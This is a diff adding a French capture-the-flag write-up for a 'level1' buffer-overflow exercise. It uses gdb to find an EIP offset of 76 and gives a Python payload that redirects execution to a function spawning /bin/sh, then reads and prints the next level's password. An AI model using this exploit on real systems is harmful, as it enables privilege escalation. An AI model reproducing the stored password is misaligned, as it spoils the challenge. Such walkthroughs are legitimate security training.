@@ -1,0 +1,52 @@
+LEVEL 1
+-------
+
+1.	gdb level1
+
+2.	disas main
+	Ligne +16: call <gets>
+	On peut voir que le programme utilise gets, cette fonction
+	peut être vulnérable au buffer overflow.
+
+3.	info functions
+	Une fonction run est présente.
+
+4.	disas run
+	On peut voir que la fonction system est appelée dans run avec un
+	paramètre 0x8048584, qui donne x/s 0x8048584 "/bin/sh".
+	Ce qu'on va faire c'est que on va essayer d'appeler la fonction run
+	en utilisant le buffer overflow.
+
+5.	Tout d'abord il faut trouver l'adresse de l'EIP qui est le registre
+	qui contient l'adresse de la prochaine instruction que le processeur
+	doit exécuter.
+	Pour cela on va se rendre sur: https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+	On retourne sur: gdb level1
+
+6.	run
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+	Program received signal SIGSEGV, Segmentation fault.
+	0x63413563 in ?? () ----> Voici l'adresse de l'EIP
+
+7.	Maintenant qu'on a la valeur de l'EIP nous pouvons trouver la taille de l'offset avant d'atteindre le registre
+	qui nous intéresse.
+	0x63413563 -----> Offset: 76
+
+8.	Il faut mettre 76 caractères aléatoires avant de mettre l'instruction qui permet
+	lancer la fonction run. L'instruction run va être lancé grâce à son adresse.
+	info functions
+	0x08048444  run ---> \x44\x84\x04\x08 (Ecriture Little Endian)
+
+9.	On quitte gdb et on créé l'injection + l'offset.
+	python -c 'print "Z"*76+"\x44\x84\x04\x08"' > /tmp/eip_inject
+
+10.	Pour finir on va faire en sorte que le programme lise le fichier que l'on
+	vient de créer.
+	cat /tmp/eip_inject - | ./level1
+	'-' qui correspond à l'entrée standard.
+
+11.	cd ../level2 && cat .pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+12.	su level2
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
